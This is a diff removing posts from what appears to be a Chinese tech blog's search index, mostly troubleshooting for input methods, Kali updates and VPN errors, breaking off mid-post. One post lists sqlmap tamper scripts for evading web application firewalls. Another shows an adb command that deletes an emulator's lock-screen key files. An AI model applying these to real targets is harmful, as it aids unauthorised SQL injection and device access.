@@ -1,629 +1,187 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title><![CDATA[微软输入法英文变大空格修复办法]]></title>
-      <url>/2019/08/18/microsoft-Input-English-Becomebigger/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>日常使用键盘输入过程中，可能误操作或触发到某快捷键导致输入法在英文状态下输入英文会变大有空格间距，来回输入法关闭切换实在让人头疼，谷歌、bing一波找到解决办法，因该问题遇见多次留个笔记以防以后忘记。</p>
-<p><img src="http://cdn.killlan.com/1566140978.png" alt="errorimages"></p>
-<h1 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h1><p>桌面右下角在中字鼠标右键–&gt;选中全半角(半角)(W)–&gt;选择半角(H)</p>
-<p>如图<br><img src="http://cdn.killlan.com/Snipaste_2019-08-18_23-38-32.png" alt="xiufufangfa1"></p>
-<p>并且加上快捷键会非常秒哦</p>
-<p>桌面右下角在中字鼠标右键–&gt;快捷键设置(K)–&gt; Shift + 空格</p>
-<p>如图<br><img src="http://cdn.killlan.com/Snipaste_2019-08-18_23-43-33.png" alt="Snipaste_2019-08-18_23-43-33"></p>
-<p><img src="http://cdn.killlan.com/Snipaste_2019-08-18_23-44-00.png" alt="xiufufangfa2"></p>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> win10 </tag>
-            
-            <tag> 输入法英文变大空格 </tag>
-            
-            <tag> 微软输入法 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Kali Linux更新签名无效错误]]></title>
-      <url>/2018/04/26/kali-repositories-Invalid-signature/</url>
-      <content type="html"><![CDATA[<h1 id="错误回显结果"><a href="#错误回显结果" class="headerlink" title="错误回显结果"></a>错误回显结果</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br><span class="line">Ge<span class="variable">t:1</span> http://mirrors.neusoft.edu.<span class="keyword">cn</span>/kali kali-rolling InRelease [<span class="number">30.5</span> kB]</span><br><span class="line">Err:<span class="number">1</span> http://mirrors.neusoft.edu.<span class="keyword">cn</span>/kali kali-rolling InRelease</span><br><span class="line">  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">Fetched <span class="number">30.5</span> kB in <span class="number">2</span>s (<span class="number">10.4</span> kB/s)</span><br><span class="line">Reading package lists... Done</span><br><span class="line">W: An error occurred during the signature verification. The repository <span class="keyword">is</span> not updated <span class="built_in">and</span> the <span class="keyword">previous</span> <span class="built_in">index</span> <span class="keyword">files</span> will <span class="keyword">be</span> used. GPG error: http://mirrors.neusoft.edu.<span class="keyword">cn</span>/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">W: Failed <span class="keyword">to</span> fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">W: Some <span class="built_in">index</span> <span class="keyword">files</span> failed <span class="keyword">to</span> download. They have been ignored, <span class="built_in">or</span> old ones used instead.</span><br></pre></td></tr></table></figure>
-
-<h1 id="修复命令"><a href="#修复命令" class="headerlink" title="修复命令"></a>修复命令</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</span></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>apt-get clean</p>
-<p>apt-get update</p>
-</blockquote>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>*<a href="https://unix.stackexchange.com/questions/421821/invalid-signature-for-kali-linux-repositories-the-following-signatures-were-i" rel="external nofollow noopener noreferrer" target="_blank">The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository</a></p>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> KaliLinux更新报错 </tag>
-            
-            <tag> ED444FF07D8D0BF6 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[命令行获取域内登陆记录]]></title>
-      <url>/2017/10/25/commandline-query-domainloginlogon/</url>
-      <content type="html"><![CDATA[<h1 id="Cmd输入如下命令"><a href="#Cmd输入如下命令" class="headerlink" title="Cmd输入如下命令"></a>Cmd输入如下命令</h1><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">%date%</span>,<span class="variable">%time%</span>,<span class="variable">%computername%</span>,<span class="variable">%username%</span>,<span class="variable">%sessionname%</span>,<span class="variable">%logonserver%</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="写入txt"><a href="#写入txt" class="headerlink" title="写入txt"></a>写入txt</h1><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">%date%</span>,<span class="variable">%time%</span>,<span class="variable">%computername%</span>,<span class="variable">%username%</span>,<span class="variable">%sessionname%</span>,<span class="variable">%logonserver%</span> &gt;&gt; logonserver.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://cdn.killlan.com/48744b0512a8ef823cbc64eed9d9d46b.png" alt="cmd执行显示如下"></p>
-]]></content>
-      
-        <categories>
-            
-            <category> 内网渗透 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 登陆记录查询 </tag>
-            
-            <tag> 内网 </tag>
-            
-            <tag> 域控 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[使用sqlmap tamper脚本绕过waf]]></title>
-      <url>/2017/10/01/sqlmap-bypass-waf/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>WAF（Web应用防火墙）已经成为标准安全解决方案之一。正因为如此，很多公司都不关心甚至有Web应用漏洞。不幸的是，并不是所有的都是无边无线的绕过！本文将告诉您如何在SQLMap旁路WAF / IDS上使用篡改脚本。</p>
-<p>篡改脚本将修改请求以避免检测WAF规则。很多时候，您需要使用多个篡改脚本。</p>
-<p>例如：如果您使用“space2hash.py”和“space2morehash.py”篡改脚本，这些脚本将自动将所有空格转换为随机注释，并扩展此脚本的版本（space2morehash.py）将帮助您“破坏”功能绕过WAF。<br>输入：1 AND 1234 = 1234<br>输出：1％23PTTmJopxdWJ％0AAND％23cWfcVRPV％0A1234 = 1234</p>
-<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>要在sqlmap上使用篡改脚本，请使用-tamper标志:</p>
-<blockquote>
-<p>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor</p>
-</blockquote>
-<p>要测试mssql，您可以使用以下所有篡改：</p>
-<blockquote>
-<p>tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</p>
-</blockquote>
-<p>以下是支持mssql和mysql的篡改列表：</p>
-<blockquote>
-<p>tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</p>
-</blockquote>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> sqlmap </tag>
-            
-            <tag> bypasswaf </tag>
-            
-            <tag> 绕过waf </tag>
-            
-            <tag> sqlmaptamper </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[海马玩模拟器密码清除]]></title>
-      <url>/2017/09/24/haimawan-reset-pass/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>海马玩模拟器是一款可以在电脑运行的安卓模拟器,由于某天需要在海马玩模拟器链接VPN,强制需要设置锁屏密码,过几天再用发现密码忘记了,于是翻资料找解决方法.</p>
-<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>1.打开海马玩模拟器默认安装目录win32：”C:\Program Files\Droid4X” Win64：”C:\Program Files (x86)\Droid4X”<br>2.快捷键win + r启动运行,输入CMD回车进入命令管理窗口,并输入”cd C:\Program Files (x86)\Droid4X”切换到海马玩模拟器安装目录<br>3.输入”adb devices”回车,返回信息如下:</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Droid4X</span>&gt;<span class="title">adb</span> <span class="title">devices</span></span></span><br><span class="line"><span class="function"><span class="title">List</span> <span class="title">of</span> <span class="title">devices</span> <span class="title">attached</span></span></span><br><span class="line"><span class="function">127.0.0.1:26944 <span class="title">device</span></span></span><br></pre></td></tr></table></figure>
-
-<p>请关闭模拟器或断开多余的USB<br>成功的返回信息:</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Droid4X</span>&gt;<span class="title">adb</span> <span class="title">devices</span></span></span><br><span class="line"><span class="function">* <span class="title">daemon</span> <span class="title">not</span> <span class="title">running</span>. <span class="title">starting</span> <span class="title">it</span> <span class="title">now</span> <span class="title">on</span> <span class="title">port</span> 5037 *</span></span><br><span class="line"><span class="function">* <span class="title">daemon</span> <span class="title">started</span> <span class="title">successfully</span> *</span></span><br><span class="line"><span class="function"><span class="title">List</span> <span class="title">of</span> <span class="title">devices</span> <span class="title">attached</span></span></span><br></pre></td></tr></table></figure>
-
-<p>4.打开海马玩模拟器<br>5.在刚刚的命令行输入”adb -s 127.0.0.1:26944 shell rm -r -f /data/system/*.key”删除模拟器的密码wenjian,并回车<br>,没有任何返回信息即成功.<br>5.返回海马玩模拟器,点击密码框,回车即可进入系统.</p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>步骤不算多,能真正解决问题即可<br>生活就是为了不断的去尝试和折腾,不去尝试怎么知道你就不能做呢?</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 安卓模拟器 </tag>
-            
-            <tag> 海马玩模拟器 </tag>
-            
-            <tag> 密码清除 </tag>
-            
-            <tag> adb </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[vpn常见问题]]></title>
-      <url>/2017/09/21/vpn-faq/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>在日常使用Vpn中会出现各种问题,下面我将列出一些常见问题的解决方法.</p>
-<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><h2 id="VPN连接频繁掉线，无法连接服务器"><a href="#VPN连接频繁掉线，无法连接服务器" class="headerlink" title="VPN连接频繁掉线，无法连接服务器"></a>VPN连接频繁掉线，无法连接服务器</h2><p>运营商会随机干扰某些协议VPN端口，遇到这种情况时，请切换到其它协议使用即可。</p>
-<h2 id="错误-789-768-解决方法"><a href="#错误-789-768-解决方法" class="headerlink" title="错误 789/768 解决方法"></a>错误 789/768 解决方法</h2><p>1,点击 开始;<br>2,选择 控制面板<br>3,选择 管理工具，如果没有看到管理工具的选项，请在左上角，选择 经典视图;<br>4,选择服务，并查找 IPSec Service，在”属性”中设置”启动类型”为”自动”并启动服务.<br>（Win7/8下的服务名叫：IPSec Policy Agent）</p>
-<h2 id="错误-628-629-734-解决方法"><a href="#错误-628-629-734-解决方法" class="headerlink" title="错误 628/629/734 解决方法"></a>错误 628/629/734 解决方法</h2><p>出现这样的错误是加密模式选择错误。<br>请点击VPN→属性→安全→数据加密 在这个选项里，选择为可选加密，如果有看到MS-CHAPV2选项，请选中。<br>保存设置，再连接，就可以了</p>
-<h2 id="错误-868-解决方法"><a href="#错误-868-解决方法" class="headerlink" title="错误 868 解决方法"></a>错误 868 解决方法</h2><p>这种情况有2种原因：<br>由于本地网络的DNS服务器无法正确解析境外域名造成的。你需要将本地连接或无线连接的DNS服务器设置为208.67.222.222和8.8.8.8才能正确解析的（或者使用 114.114.114.114）。<br>服务器地址填写错误，VPN服务器地址（Internet地址）请在VPN提供商服务器列表里查看，建议使用域名连接。</p>
-<h2 id="错误-691-解决方法"><a href="#错误-691-解决方法" class="headerlink" title="错误 691 解决方法"></a>错误 691 解决方法</h2><p>帐号填写错误,请确认帐号/密码是否填写正确，密码区分大小写；<br>是否使用相应套餐可用服务器；<br>帐号是否到期；</p>
-<h2 id="错误-651-解决办法"><a href="#错误-651-解决办法" class="headerlink" title="错误 651 解决办法"></a>错误 651 解决办法</h2><p>1.服务器人数已满；<br>2.由于网络响应不及时，用户连续点击“连接”造成操作上的失误。<br>3.连接VPN时，当调制解调器(或其它连接设备)报告了一个错误，此时提示VPN错误称为VPN错误651。</p>
-<blockquote>
-<p>VPN错误651处理方法:</p>
-</blockquote>
-<p>1.如果是服务器人数已满,请换其他服务器进行连接；或者是你连接次数过多,导致无法正常跟服务器连接,请稍等两分钟再连接，或者重启下电脑。<br>2.如果是由于网络响应不及时，用户连续点击“连接”造成操作上的失误。关闭客户端软件，稍等片刻重新启动软件连接即可。<br>3.如果在网吧，请重启计算机，如果还解决不了联系网管。<br>4.虚拟网卡出现问题。解决办法重装虚拟机。<br>5.调制解调器出现故障。右击网上邻居属性，先暂时本地禁用一下，然后再启用本地，然后你把调制解调器的驱动卸载再重装一次，然后把你原来设置的拨号删除，重新再建一个，然后再次连接。</p>
-<h2 id="错误-721-解决办法"><a href="#错误-721-解决办法" class="headerlink" title="错误 721 解决办法"></a>错误 721 解决办法</h2><p>vpn错误721是电脑产生所导致的错误。 或者可以这样理解远程计算机没有响应。如果是从VPN商购买VPN，当登陆的购买VPN连接器时提示错误721时，直接联系VPN商解决。</p>
-<blockquote>
-<p>通常地常见VPN错误721有以下两个；</p>
-</blockquote>
-<p>1、 由于客户端电脑在局域网中并通过路由器上网所致。通熟点说是你本地路由问题。 主要原因是：VPN721错误是由于您的电脑处在您的电脑的上网方式是通过局域网中的路由器上网的造成的。例如：您的电脑是通过局域网中的路由器上网，在 局域网中就可能存在多台电脑，服务器就无法正确判断具体是哪台电脑（由于内网所有电脑的IP地址都是一样的），所以连接时会提示错误721。<br>2、该错误是由于客户端电脑跟服务器使用不同宽带服务商之间的直接互访问题所致。这个主要指的是网络宽带商的问题，一般的话是铁通宽带、长城宽带才会发生类似的问题；反之，是网通宽带、电信宽带很少出现这样的情况；</p>
-<blockquote>
-<p>常见VPN错误721解决方法</p>
-</blockquote>
-<p>1.单击“开始”，然后单击“运行”。<br>2.在“打开”框中，键入 regedit，然后单击“确定”。<br>3.在注册表编辑器中，找到以下子项</p>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\&#123;<span class="number">4</span>D36E972-E325-<span class="number">11</span>CE-BFC1-<span class="number">08002</span>bE10318&#125;\&lt;<span class="number">000</span>x&gt;</span><br></pre></td></tr></table></figure>
-
-<p>其中 &lt;000x&gt; 是 WAN 微型端口 (PPTP) 驱动程序的网络适配器。<br>4.在“编辑”菜单上，指向“新建”，然后单击“DWORD 值”。<br>5.键入 ValidateAddress，然后按 Enter。该值的默认设置为“1”（打开）；因此，您可以通过将其设置为“0”将其关闭。<br>6.退出注册表编辑器。<br>7.重新启动计算机。</p>
-<h2 id="错误-720-解决办法"><a href="#错误-720-解决办法" class="headerlink" title="错误 720 解决办法"></a>错误 720 解决办法</h2><p>vpn错误720定义是无法建立与远程计算机的连接。您可能需要更改此连接的网络设置。也可以简单理解成VPN服务器问题。<br>vpn错误720处理方法：<br>1.可能服务器问题，非用户问题，请向管理员反映；可能是服务器人过多，你可以尝试多连几次。<br>2.看看你电脑或者VPN服务器宽带连接是否正常。<br>3.还有另一种解决方法，重装TCP/IP协议:<br>（1）、开始——运行——regedit.exe，打开注册表编辑器，删除以下两个键：</p>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Winsock</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Winsock2</span><br></pre></td></tr></table></figure>
-
-<p>（2）、用记事本打开%winroot%\inf\nettcpip.inf文件，找到：<br>[MS_TCPIP.PrimaryInstall]<br>Characteristics = 0xa0 &lt;――――――把此处的0Xa0改为0x80 保存退出<br>（3）、打开本地连接的TCP/IP属性――-添加协议——从磁盘——浏览找到刚刚保存的 nettcpip.inf(%winroot%\inf\nettcpip.inf)文件，然后选择“TCP/IP协议”（不是选择那个TCP/IP 版本6）。<br>经过这一步之后，又返回网络连接的窗口，但这个时候，那个“卸载”按钮已经是可用的了。点这个 “卸载”按钮来把TCP/IP协议删除，然后重启一次机器。<br>（4）、重启后再照着第3步，重新安装一次TCP/IP协议便可。<br>（5）、再重启一次，这时应该可以了，可以照着需要，设置一下IP地址。</p>
-<h2 id="错误-769-解决办法"><a href="#错误-769-解决办法" class="headerlink" title="错误 769 解决办法"></a>错误 769 解决办法</h2><p>1.确保网络电缆已连接。即保证自己电脑可以顺利上网。<br>2.网络连接是否禁用。首先打开“我的电脑”→“控制面版”→“网络连接”，查看本地连接的是否处在 “禁用”状态，是的话只需双击本地连接，看到状态变为“已启用”即可。<br>3.网卡问题。若是连本地连接都没有的话，绝大部分情况是你网卡有问题；此时请检查网卡装好了没或网卡坏了。如果是网卡没装好重装即可。 如果是网卡坏了即时更换。例如：电脑中毒，把病毒删除之后出现VPN错误769代码，此时卸载网卡，重新搜索新硬件。重装网卡即可。<br>4.当本地能上网而连接不上VPN服务器。原因是当本机能上网并不代表你一定能连接到指定的VPN服务器，此时可以ping对应VPN服务器IP，如果 ping得通证明服务器没问题即可以连接上。导致的原因有VPN服务器没有开启或者你的电脑防火墙阻挡住VPN连接导致无法连接到目标。<br>5.硬件问题。例如：路由器不支持VPN，不过现在比较少，或者路由器自带防火墙阻挡了。<br>注意：出现VPN错误769代码，绝大多数是网卡被禁用，此时启用即可！造成的原因一般为：用户的误操作或一些防火墙软件、计算机病毒引起的。如果没有找到本地连接，一般是网卡的驱动程序丢了或计算机没有检测到网卡，此时需要重新安装即可。</p>
-<h2 id="错误-650-解决办法"><a href="#错误-650-解决办法" class="headerlink" title="错误 650 解决办法"></a>错误 650 解决办法</h2><p>在建立VPN时，远程计算机没有响应，断开连接，此时通常出现VPN错误650。<br>出现VPN错误650的原因：ADSL ISP服务器故障，网卡故障，非正常关机造成网络协议导致出错。<br>VPN错误650解决办法：检查ADSL信号灯是否能正确同步，检查网卡，删除所有网络组件重新安装网络。</p>
-<h2 id="错误-711-解决办法"><a href="#错误-711-解决办法" class="headerlink" title="错误 711 解决办法"></a>错误 711 解决办法</h2><p>v PN 错误711，导致原因相关服务没有开启,一般可以查阅以下3个服务Telephony、 Remote Access Connection Manager 、Remote Access Auto Connection Manager.这是Win7电脑系统里面算是一个比较常见的问题:<br>VPN错误711导致的原因：<br>1.检查网卡是否装好,重新安装网卡驱动；同时重新设置网络拨号连接。<br>2.检查下列服务是否被禁用了,如果被禁，将其改为手动。Telephony(电话服务)Remote Access Connection Manager(远程访问连接管理器)Remote Access Auto Connection Manager(远程访问自动连接管理器)<br>3.用管理员账号登陆，再打开C：\windows\system32\logfiles ，找到 wmi文件夹，在wmi文件夹上点右键，点选 获取管理员权限 ,重启即可修复。<br>4.开始-运行-输入 CMD -确定-在命令符后输入netsh winsock reset -回车，重启。<br>5.更改计算机名称。右击计算机－属性－高级系统设置－计算机名－更改－把更改里的计算机名改一个简短的，比如 china -确定。<br>6.换个系统版本重装系统。</p>
-<blockquote>
-<p>vpn错误711解决方法：</p>
-</blockquote>
-<p>1.启动Remote Access Connection Manager与Network Connections与Telephony服务。<br>2.启动方法一：开始-&gt;运行-&gt;在里面输入：services.msc -&gt;（双击）Remote Access Connection Manager与Network Connections与Telephony -&gt;启动这三项服务<br>3.启动方法二：新建一个文本文件（后缀为.txt）的文件，将下面的内容复制进去：</p>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span>开启VPN执行环境必要系统服务</span><br><span class="line">@<span class="built_in">pause</span></span><br><span class="line">sc config TapiSrv <span class="built_in">start</span>= AUTO</span><br><span class="line">sc config Netman <span class="built_in">start</span>= AUTO</span><br><span class="line">sc config RasMan <span class="built_in">start</span>= AUTO</span><br><span class="line"><span class="built_in">Net</span> <span class="built_in">start</span> TapiSrv</span><br><span class="line"><span class="built_in">Net</span> <span class="built_in">start</span> RasMan</span><br><span class="line"><span class="built_in">Net</span> <span class="built_in">start</span> Netman</span><br><span class="line">@<span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
-
-<p>点击菜单-&gt;文件-&gt;另存为；文件类型选“所有文件”；文件名“服务.bat”；保存好后双击“服务.bat”，即可完成系统服务设置。</p>
-<h2 id="错误-634-解决办法"><a href="#错误-634-解决办法" class="headerlink" title="错误 634 解决办法"></a>错误 634 解决办法</h2><p>远程访问VPN服务器不能在网络上注册你的计算机名称，这一般随着NetBIOS协议一起出现，但也可能随着tcp/ip或者ipx一起出现。通常，当地址已经在网络上使用时，会发生vpn错误634。如果对这方面不是很专业的请与系统管理员联系处理vpn错误634。</p>
-<h2 id="错误-678-解决办法"><a href="#错误-678-解决办法" class="headerlink" title="错误 678 解决办法"></a>错误 678 解决办法</h2><p>1.可能是vpn服务器人数过多，请尝试多连接几次 ；<br>2.可能是你装反了客户端，请重新安装客户端；<br>3.从上面定义不难看出，调制解调器或其他设备故障，检查号码，再拨号。如果是虚拟专用网络 (VPN) 连接，则检查目标服务器的主机名或 IP 地址，然后再次尝试连接。还要确保电话线(网线)插在调制解调器（网卡）的正确插槽中。<br>4.VPN pptp远程拨号错误678；<br>5.如果您是购买VPN用户直接联系商家解决；</p>
-<h2 id="错误-619-解决办法"><a href="#错误-619-解决办法" class="headerlink" title="错误 619 解决办法"></a>错误 619 解决办法</h2><p>vpn错误619是指端口已断开连接。也可以理解成已经断开了VPN连接。</p>
-<blockquote>
-<p>vpn错误619原因以及解决办法:</p>
-</blockquote>
-<p>1.vpn错误619；这种情况大数多原因为多人连接VPN服务器异常中断，因绝大部分VPN服务器限制一个帐户同时只有一个人使用，所以一般来说一个VPN账号只能一个人使用，多人登陆就会出现这种情况。<br>解决办法：VPN只能一个人登陆VPN连接器。<br>以下vpn错误619两点基本是商家需要解决的，如果以上第一点排除之外普通VPN用户直接联系商家解决即可；<br>2.这种情况大数多原因为客户机连接Internet的网关（如家庭宽带路由或公司上网网关路由或防火墙）NAT-T功能关闭或对VPN支持性不好，主要是对GRE及PPTP协议的NAT-T不支持。<br>解决办法：打开网关路由的NAT-T功能，如果还是出现错误，则需要更换网关设备，现在大多数设备已经支持。<br>3.（这点是VPN服务商的问题）有些VPN服务器没有设置异常断线检查功能也可能导致用户一旦异常断开后很长时间不能连接。<br>解决办法：在服务器上设置异常断线检查程序或功能。</p>
-<h2 id="错误-800-解决办法"><a href="#错误-800-解决办法" class="headerlink" title="错误 800 解决办法"></a>错误 800 解决办法</h2><p>vpn错误800是指不能建立VPN连接，VPN服务器可能不能到达，或者此连接的安全参数没有正确配置。</p>
-<blockquote>
-<p>VPN800错误解决方法：</p>
-</blockquote>
-<p>一般来说你如果是购买VPN用户的话，无需下面的步骤，直接联系VPN提供商解决即可。<br>1.IP错误。检查配置中的“目的地的主机名或IP地址”使用的是域名而不是IP地址，由于VPN隧道需要定期进行维护，我们有可能变更VPN隧道服务器的IP地址，但域名不会改变。<br>2.您所在网络与我们的VPN隧道服务器没有正确的通道，请尝试更换配置中的“目的地的主机名或IP地址”，将其调整为我们的登陆服务器IP地址或者域名。<br>3.临时性故障，（如果您是用户联系VPN商家解决即可）多半是由于DNS服务器繁忙无法对服务器IP地址，或者域名的名字进行解析所引起，可以使用以下操 作：开始-&gt;运行-&gt;打开：cmd-&gt;确定，执行命令ipconfig /flushdns后再进行VPN连接尝试。<br>4.重启 电脑，删除原来建好的，重新一个新的VPN连接。 由于配置异常造成的无法连接，虽然用户没有做过任何的配置修改，但由于系统内部的故障会导致配置（注册表信息）出现异常，这是Windows系统中常见的 问题。 处理方法是删除原VPN隧道连接的配置，重新建立一个新的VPN隧道连接即可。<br>5.检查连接的安全参数配置与配置要求一致。<br>6.防火墙太严。您机器上的防火墙规则设置过于严格，导致无法对外进行连接，请调整或关闭所有防火墙再进行尝试。<br>7.如果有安装家庭网关的用户，也建议重启一下家庭网关设备。</p>
-<h2 id="错误-756-解决办法"><a href="#错误-756-解决办法" class="headerlink" title="错误 756 解决办法"></a>错误 756 解决办法</h2><p>在连接VPN代理时，VPN连接正在运行，但无法正常连接称为VPN错误756一般咱们发现提示的错误为：VPN错误756,已经拨了这个连接。但有时一开始会伴随出现VPN错误800或者VPN错误619的发生。</p>
-<blockquote>
-<p>VPN错误756原因可能由以下几点造成的：</p>
-</blockquote>
-<p>1.在连这个VPN之前，可能已连接了另一个连接，但没有正常有效断开关闭。<br>2.这个VPN的帐号未正关闭，已经或仍在使用中。就像家里ADSL帐号没正常关闭,挂着，马上再连就连不上了,隔一会连接就OK了。<br>解决方法如下:<br>1.重启下电脑；如果电脑不能有效关闭先前的VPN连接，此时重启下电脑。<br>2.重启路由器。<br>3.也有可能是这种情况多数为VISTA或者windows 7系统用户，解决方法为：请用鼠标右键点软件，选择“以管理员身份运行”即可。</p>
-<ol start="4">
-<li>当系统为XP，出现VPN错误756是因为你在登陆过程中非正常中断，导致账号连接出现错误，出现这种情况最好的办法就是：点击网上邻居—–反键—–属性 —–虚拟网络 ，在虚拟网络里面看到 VPN网络连接断开 ，删除后重启计算机，然后再连接；如果无法删除，直接重启计算机，然后再删除后连接。</li>
-</ol>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>在使用VPN时很多问题会导致其无法正常使用,以上方法仅供参考.</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Vpn常见问题 </tag>
-            
-            <tag> win10vpn </tag>
-            
-            <tag> win8vpn </tag>
-            
-            <tag> win7vpn </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[手工查看当前网站的HTTPSERVER信息]]></title>
-      <url>/2017/09/20/look-httpserver-method/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p> HTTPSERVER是每个网站搭建所用的web容器标识,例如常见:IIS、Apache、Nginx,今天教大家如何手工利用谷歌浏览器查看。</p>
-<h1 id="手工具体步骤"><a href="#手工具体步骤" class="headerlink" title="手工具体步骤"></a>手工具体步骤</h1><p>1、打开谷歌浏览器</p>
-<p>2、地址栏输入”<a href="http://www.shouyihuo.com&quot;,这个Url是我随便找的" rel="external nofollow noopener noreferrer" target="_blank">www.shouyihuo.com&quot;,这个Url是我随便找的</a></p>
-<p>3、在页面空白处鼠标右键-检查/审查元素,然后网页页面的右边会弹出一个栏目</p>
-<p>4、为了方便查看点击栏目x旁边竖着三个点，然后点击倒数第三个”Dock to boottom”</p>
-<p><img src="http://cdn.killlan.com/41e0af1d9a5b8887bc2adfe271582f9f.png" alt="dock to boottom"></p>
-<p>5、栏目就会到网页页面下方,在栏目菜单栏选择第三个”Network”浏览器刷新页面就会有一堆Url参数<br><img src="http://cdn.killlan.com/9d046df30df64d5dcf06f818cc1d2900.png" alt="elements network"></p>
-<p>6、我一般选择第一个链接点击进去,就可以看到当前Url的HTTPSERVER信息</p>
